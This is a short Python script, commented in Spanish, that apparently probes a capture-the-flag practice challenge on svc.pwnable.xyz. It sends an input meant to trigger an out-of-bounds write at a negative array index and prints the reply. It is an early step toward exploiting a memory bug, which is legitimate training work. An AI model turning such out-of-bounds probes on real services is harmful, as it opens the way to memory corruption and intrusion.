#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Recibir banner
data = s.recv(1024)
print("Banner:", data.decode())

# Probar con offset negativo pequeño
print("\nTest: XOR con offset negativo -1")
payload = "5 3 -1\n"  # 5 XOR 3 = 6, guardar en result[-1]
print(f"Enviando: {payload.strip()}")
s.sendall(payload.encode())

time.sleep(2)
try:
    resp = s.recv(1024)
    print(f"Respuesta: {resp.decode()}")
except:
    print("Sin respuesta / conexión cerrada")

s.close()